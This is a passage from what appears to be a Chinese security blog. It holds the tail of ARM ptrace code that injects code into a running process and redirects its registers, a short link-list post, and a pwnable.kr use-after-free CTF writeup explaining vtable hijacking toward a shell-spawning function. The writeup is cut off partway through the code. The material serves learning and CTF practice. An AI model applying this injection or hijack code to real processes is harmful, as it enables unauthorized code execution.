class="built_in">strcpy</span>( dlsym_param2_ptr, FunctionName );</span><br><span class="line">	_dlsym_param2_s = REMOTE_ADDR( dlsym_param2_ptr, local_code_start_ptr, remote_code_start_ptr );</span><br><span class="line"></span><br><span class="line">	<span class="comment">//保存cpsr寄存器</span></span><br><span class="line">	_saved_cpsr_s = OriginalRegs.ARM_cpsr;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//保存r0-pc寄存器</span></span><br><span class="line">	<span class="built_in">memcpy</span>( saved_r0_pc_ptr, &amp;(OriginalRegs.ARM_r0), <span class="number">16</span> * <span class="number">4</span> ); <span class="comment">// r0 ~ r15</span></span><br><span class="line">	_saved_r0_pc_s = REMOTE_ADDR( saved_r0_pc_ptr, local_code_start_ptr, remote_code_start_ptr );</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>( inject_param_ptr, FuncParameter, NumParameter );</span><br><span class="line">	_inject_function_param_s = REMOTE_ADDR( inject_param_ptr, local_code_start_ptr, remote_code_start_ptr );</span><br><span class="line"></span><br><span class="line">	ptrace_writedata( pid, remote_code_start_ptr, local_code_start_ptr, <span class="number">0x400</span> );</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>( &amp;CurrentRegs, &amp;OriginalRegs, <span class="keyword">sizeof</span>(CurrentRegs) );</span><br><span class="line">	CurrentRegs.ARM_sp = (<span class="keyword">long</span>)remote_code_start_ptr;</span><br><span class="line">	CurrentRegs.ARM_pc = (<span class="keyword">long</span>)remote_code_start_ptr;</span><br><span class="line">	ptrace_setregs( pid, &amp;CurrentRegs );</span><br><span class="line">	ptrace_detach( pid );</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Zygote注入技术的实现"><a href="#Zygote注入技术的实现" class="headerlink" title="Zygote注入技术的实现"></a>Zygote注入技术的实现</h2>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/02/14/shouji/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/14/shouji/" itemprop="url">sakuraのLibrary</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-14T14:33:44+08:00">
                2018-02-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/杂项/" itemprop="url" rel="index">
                    <span itemprop="name">杂项</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><p>Kaggle推出免费线上课程，覆盖机器学习、深度学习等四门课<br><a href="https://www.kaggle.com/learn/machine-learning" target="_blank" rel="noopener">https://www.kaggle.com/learn/machine-learning</a></p>
<h1 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h1><h2 id="手把手教你构建-C-语言编译器（其实是解释器）"><a href="#手把手教你构建-C-语言编译器（其实是解释器）" class="headerlink" title="手把手教你构建 C 语言编译器（其实是解释器）"></a>手把手教你构建 C 语言编译器（其实是解释器）</h2><p><a href="http://lotabout.me/2015/write-a-C-interpreter-0/" target="_blank" rel="noopener">http://lotabout.me/2015/write-a-C-interpreter-0/</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/02/13/uaf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/13/uaf/" itemprop="url">pwnable.kr UAF writeup</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-13T09:09:48+08:00">
                2018-02-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index">
                    <span itemprop="name">CTF</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
                  ， 
                
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/pwn/其他/" itemprop="url" rel="index">
                    <span itemprop="name">其他</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h2><ul>
<li>虚函数的内存地址空间</li>
<li>UAF</li>
</ul>
<h2 id="前置知识1：虚函数的内存地址空间"><a href="#前置知识1：虚函数的内存地址空间" class="headerlink" title="前置知识1：虚函数的内存地址空间"></a>前置知识1：虚函数的内存地址空间</h2><p>在C++中，如果类中有虚函数，那么它就会有一个虚函数表的指针__vfptr，在类对象最开始的内存数据中。之后是类中的成员变量的内存数据。<br>对于子类，最开始的内存数据记录着父类对象的拷贝（包括父类虚函数表指针和成员变量）。 之后是子类自己的成员变量数据。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-013327.jpg" alt=""></p>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Base::f"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Base::g"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Base::h"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">    <span class="keyword">int</span> base; </span><br><span class="line">    <span class="keyword">protected</span>: </span><br><span class="line">    <span class="keyword">private</span>: </span><br><span class="line">&#125;; </span><br><span class="line"><span class="comment">//子类1，无虚函数重载 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child1</span> :</span> <span class="keyword">public</span> Base </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f1</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Child1::f1"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g1</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Child1::g1"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h1</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Child1::h1"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">    <span class="keyword">int</span> child1; </span><br><span class="line">    <span class="keyword">protected</span>: </span><br><span class="line">    <span class="keyword">private</span>: </span><br><span class="line">&#125;; </span><br><span class="line"><span class="comment">//子类2，有1个虚函数重载 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child2</span> :</span> <span class="keyword">public</span> Base </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Child2::f"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g2</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Child2::g2"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h2</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"Child2::h2"</span> &lt;&lt; <span class="built_in">endl</span>; &#125; </span><br><span class="line">    <span class="keyword">int</span> child2; </span><br><span class="line">    <span class="keyword">protected</span>: </span><br><span class="line">    <span class="keyword">private</span>: </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="单一继承，无虚函数重载"><a href="#单一继承，无虚函数重载" class="headerlink" title="单一继承，无虚函数重载"></a>单一继承，无虚函数重载</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-013745.jpg" alt=""></p>
<h3 id="单一继承，重载了虚函数"><a href="#单一继承，重载了虚函数" class="headerlink" title="单一继承，重载了虚函数"></a>单一继承，重载了虚函数</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-013807.jpg" alt=""></p>
<h3 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-013830.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-013904.jpg" alt=""></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>如果一个类中有虚函数，那么就会建立一张虚函数表vtable，子类继承父类vtable，若，父类的vtable中私有(private)虚函数,则子类vtable中同样有该私有(private)虚函数的地址。<strong>注意这并不是直接继承了私有(private)虚函数</strong></li>
<li>当子类重载父类虚函数时，修改vtable同名函数地址，改为指向子类的函数地址，若子类中有新的虚函数，在vtable尾部添加。</li>
<li>vptr每个对象都会有一个，而vptable是每个类有一个，vptr指向vtable，一个类中就算有多个虚函数，也只有一个vptr；做多重继承的时候，继承了多个父类，就会有多个vptr</li>
</ul>
<h2 id="前置知识2：Use-After-Free"><a href="#前置知识2：Use-After-Free" class="headerlink" title="前置知识2：Use-After-Free"></a>前置知识2：Use-After-Free</h2><h3 id="Dangling-pointer"><a href="#Dangling-pointer" class="headerlink" title="Dangling pointer"></a>Dangling pointer</h3><p><a href="https://zh.wikipedia.org/wiki/%E8%BF%B7%E9%80%94%E6%8C%87%E9%92%88" target="_blank" rel="noopener">Dangling pointer</a><br>Dangling pointer即指向被释放的内存的指针，通常是由于释放内存后，未将指针置为NULL。</p>
<h3 id="UAF原理"><a href="#UAF原理" class="headerlink" title="UAF原理"></a>UAF原理</h3><p>对Dangling pointer所指向内存进行use，如指针解引用等。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>将Dangling pointer所指向的内存重新分配回来，且尽可能使该内存中的内容可控（如重新分配为字符串）</p>
<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> (*func)() <span class="comment">//函数指针，可以理解为类里面的方法</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>假设有上述这样的一个结构体指针p。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-060816.jpg" alt="">在释放掉p之后，没有将p置NULL，所以p变成Dangling pointer，再通过重新分配，再次拿到p之前指向的这段地址空间。<br>之后，通过strcpy(p2,”addr”)，或者其他方式，向这段地址空间写入新数据。<br>然后当我们通过其他函数，再次使用p指针，就会造成无法预料的后果，因为<strong>此时p指针指向的内存包含的已经是完全不同的数据</strong></p>
<ul>
<li>任意地址读：puts(p-&gt;name)—————&gt;puts(char*(addr2))</li>
<li>任意地址写：strcpy(p-&gt;name,data);——&gt;strcpy((char *)(addr2),data)</li>
<li>控制流劫持：p-&gt;func()———————&gt;call addr3</li>
</ul>
<h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="http://pwnable.kr/play.php" target="_blank" rel="noopener">http://pwnable.kr/play.php</a><br><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/pwnable.kr/uaf" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/pwnable.kr/uaf</a><br><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/pwnable.kr/uaf.cpp" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/pwnable.kr/uaf.cpp</a></p>
<h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">		system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> age;</span><br><span class="line">	<span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"My name is "</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"I am "</span> &lt;&lt; age &lt;&lt; <span class="string">" years old"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a nice guy!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a cute girl!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        Human* m = <span class="keyword">new</span> Man(<span class="string">"Jack"</span>, <span class="number">25</span>);</span><br><span class="line">        Human* w = <span class="keyword">new</span> Woman(<span class="string">"Jill"</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">size_t</span> len;</span><br><span class="line">        <span class="keyword">char</span>* data;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"1. use\n2. after\n3. free\n"</span>;</span><br><span class="line">                <span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">switch</span>(op)&#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                                m-&gt;introduce();</span><br><span class="line">                                w-&gt;introduce();</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                                len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">                                data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">                                read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">                                <span class="built_in">cout</span> &lt;&lt; <span class="string">"your data is allocated"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                                <span class="keyword">delete</span> m;</span><br><span class="line">                                <span class="keyword">delete</span> w;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先checksec<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-13-062433.png" alt=""><br>因为这是一道开源pwn，给了我们源码，而且代码也不复杂，没有什么逆向的必要，为了方便理解，我就直接从源码进行分析。</p>
<h3 id="类的继承和虚表"><a href="#类的继承和虚表" class="headerlink" title="类的继承和虚表"></a>类的继承和虚表</h3><p>可以看出Man和Woman都是继承了Human类，并且可以看出只要我们将控制流劫持到Human类的私有虚函数give_shell，就能getshell了。<br>Man和Woman都继承了Human类的vtable，可以通过调试，跟随子类的构造函数，找到vtable。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">		system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="keyword">int</span> age;</span><br><span class="line">	<span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"My name is "</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"I am "</span> &lt;&lt; age &lt;&lt; <span class="string">" years old"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a nice guy!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::introduce();</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a cute girl!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Human* m = <span class="keyword">new</span> Man(<span class="string">"Jack"</span>, <span class="number">25</span>);</span><br><span class="line">Human* w = <span class="keyword">new</span> Woman(<span class="string">"Jill"</span>, <span class="number">21</span>);</span><br><span class="line"><span class="keyword">size_t</span> len;</span><br><span class="line"><span class="keyword">char</span>* data;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"1. use\n2. after\n3. free\n"</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line">        <span class="keyword">switch</span>(op)&#123;</span><br><span class="line">                 <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                        m-&gt;introduce();</span><br><span class="line">                        w-&gt;introduce();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                        len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">                        data = <span class="keyword">new</span> <span 